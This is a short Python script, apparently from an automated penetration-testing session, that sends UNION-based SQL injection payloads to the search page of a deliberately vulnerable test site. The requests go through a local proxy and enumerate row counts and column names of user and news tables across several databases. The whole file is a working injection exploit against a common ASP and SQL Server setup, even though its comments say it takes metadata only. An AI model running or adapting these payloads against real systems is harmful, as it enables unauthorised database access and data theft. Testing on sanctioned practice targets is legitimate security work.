#!/usr/bin/env python3
"""Round 7 보강 5 — 교차 DB 데이터 접근 권한 확인 (행 수/컬럼명만, 값 추출 없음)."""
import subprocess, urllib.parse

BASE = "http://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]
SCR = "/home/taeuk/projects/llm-abliteration/hermes-harness/journal/web/testphp-vulnweb-test/scratch/r7"


def union(select_list, tag):
    st = "q')>0) UNION ALL SELECT " + select_list + "--"
    url = f"{BASE}/Search.asp?tfSearch=" + urllib.parse.quote(st, safe="")
    bod = f"{SCR}/U_{tag}.html"
    r = subprocess.run(["curl", "-s", "-S"] + PROXY + ["-m", "60", "-o", bod,
                       "-w", "%{http_code} %{time_total}", url],
                       capture_output=True, text=True)
    body = open(bod, "rb").read().decode("latin-1")
    i = body.find("posted by")
    poster = ""
    if i >= 0:
        poster = body[i + 9:body.find("</b>", i)].strip()
    print(f"  [{tag:28}] {(r.stdout or '').strip()}  poster={poster}")


print("Y1. 교차 DB 행 수(권한 확인용, 값 추출 없음)")
for db, t in [("acublog", "users"), ("acublog", "news"), ("acublog", "comments"),
              ("acuservice", "users")]:
    union(f"1,CAST((SELECT COUNT(*) FROM {db}.dbo.{t}) AS nvarchar(20))"
          ",'T','M',1,1,GETDATE(),'A','TT','FN'", f"count_{db}_{t}")

print("Y2. 교차 DB 컬럼명 (메타데이터만)")
for db, t in [("acublog", "users"), ("acuservice", "users")]:
    union(f"1,(SELECT STUFF((SELECT ','+name FROM {db}.sys.columns WHERE object_id=OBJECT_ID('{db}.dbo.{t}') FOR XML PATH('')),1,1,''))"
          ",'T','M',1,1,GETDATE(),'A','TT','FN'", f"cols_{db}_{t}")
